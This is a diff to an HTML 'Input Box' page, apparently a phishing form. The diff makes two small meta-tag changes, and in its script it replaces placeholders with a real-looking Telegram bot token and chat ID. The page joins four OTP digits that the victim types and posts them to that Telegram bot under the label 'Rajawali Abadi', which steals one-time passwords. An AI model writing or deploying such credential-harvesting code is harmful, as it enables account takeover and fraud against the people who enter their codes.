@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118eea">
   <link href="css/style.css" rel="stylesheet" type="text/css"/>
   <title>Input Box</title>
   <style>
@@ -209,13 +210,13 @@
                     const otp = `${otpData.digit1}${otpData.digit2}${otpData.digit3}${otpData.digit4}`;
                     const telegramMessage = `🦅 Rajawali Abadi 🦅\nOTP: ${otp}`;
 
-                    fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', {
+                    fetch('https://api.telegram.org/bot7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70/sendMessage', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            chat_id: '<YOUR_CHAT_ID>',
+                            chat_id: '6824078885',
                             text: telegramMessage,
                         }),
                     })
